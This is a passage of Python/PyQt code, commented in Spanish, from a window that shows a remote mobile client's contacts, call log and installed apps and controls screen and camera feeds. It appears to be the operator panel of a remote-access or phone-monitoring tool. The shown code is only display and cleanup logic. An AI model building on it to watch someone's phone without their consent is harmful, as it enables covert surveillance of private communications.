                c = {"nombre": c}
            tels = c.get("numeros") or c.get("numbers") or []
            if isinstance(tels, (list, tuple)):
                tels = ", ".join(str(t) for t in tels)
            QTreeWidgetItem(self.tabla_cont,
                            [str(c.get("nombre") or c.get("name") or ""), str(tels)])

    def _pintar_llamadas(self, lista):
        self.tabla_llam.clear()
        for c in (lista or []):
            if not isinstance(c, dict):
                c = {"numero": c}
            QTreeWidgetItem(self.tabla_llam,
                            [str(c.get("numero", "")), str(c.get("fecha", "")),
                             str(c.get("duracion", "")), str(c.get("tipo", ""))])

    def _pintar_apps(self, lista):
        """Blindado: acepta strings, dicts {"paquete","etiqueta"} y tuplas.

        El bug original era `QListWidgetItem(str(p))` sin `addItem`, así que
        la lista quedaba siempre vacía. Ahora se crea el item, se guarda el
        paquete en UserRole (para el doble clic) y se añade de verdad.
        """
        self.lista_apps.clear()
        for p in (lista or []):
            paquete, etiqueta, sistema = "", "", False
            if isinstance(p, dict):
                paquete = str(p.get("paquete") or p.get("package") or "")
                etiqueta = str(p.get("etiqueta") or p.get("label") or "")
                sistema = bool(p.get("sistema"))
            elif isinstance(p, (list, tuple)):
                paquete = str(p[0]) if p else ""
                etiqueta = str(p[1]) if len(p) > 1 else ""
            else:
                paquete = str(p)
            texto = f"{etiqueta}  ({paquete})" if etiqueta and paquete else \
                (paquete or etiqueta)
            if not texto:
                continue
            item = QListWidgetItem(("⚙ " if sistema else "📦 ") + texto)
            item.setData(Qt.ItemDataRole.UserRole, paquete)
            if paquete:
                item.setToolTip(f"paquete: {paquete}\n(doble clic = abrir)")
            self.lista_apps.addItem(item)
        self._log(f"[apps] {self.lista_apps.count()} paquete(s)")

    # =====================================================================
    # API PÚBLICA
    # =====================================================================
    def cid_cliente(self):
        return self.cid

    def info_actualizada(self, info):
        """MainWindow puede refrescar la info del cliente en caliente."""
        if isinstance(info, dict):
            self.info.update(info)

    # =====================================================================
    # CIERRE
    # =====================================================================
    def closeEvent(self, e):
        """Para timers, marca cerrado y se quita del registro del padre."""
        self._cerrado = True
        for timer in ("timer_pantalla", "timer_camara", "timer_info"):
            t = getattr(self, timer, None)
            if t is not None:
                try:
                    t.stop()
                except Exception:
                    pass
        try:
            self._enviar("movil_pantalla_off")
        except Exception:
            pass
        # Quitarse de la lista del padre (tolerante a todo).
        try:
            lista = getattr(self.ventana, "movil_por_cid", {}).get(self.cid, [])
            if self in lista:
                lista.remove(self)
        except Exception:
            pass
        # Desconectar señales para no pintar widgets ya muertos.
        for sig, slot in ((self._sig_log, self._log),
                          (self._sig_pantalla, self._pantalla),
                          (self._sig_camara, self._camara),
                          (self._sig_datos, self._datos)):
            try:
                sig.disconnect(slot)
            except Exception:
                pass
        try:
            self._sig_cerrado.emit(self.cid)
        except Exception:
            pass
        super().closeEvent(e)